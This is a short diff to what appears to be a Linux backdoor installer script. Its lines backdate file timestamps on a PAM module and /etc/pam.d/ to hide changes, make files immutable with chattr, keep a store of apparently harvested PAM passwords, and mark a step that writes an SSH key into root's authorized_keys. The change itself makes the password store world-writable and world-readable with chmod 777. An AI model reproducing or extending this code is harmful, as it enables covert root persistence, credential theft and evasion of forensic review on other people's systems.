@@ -42,8 +42,8 @@ touch -d "Mar 15 2018" "$PAM_SO_PATH"
 touch -d "Mar 15 2018" "/etc/pam.d/"
 chattr +i "$PAM_SO_PATH"
 
-
 touch -d "Aug 2 2014" "$PAM_PASSWORD_STORE"
+chmod 777 "$PAM_PASSWORD_STORE"
 chattr +i "$PAM_PASSWORD_STORE"
 
 # Write SSH key to /root/.ssh/authorized_keys
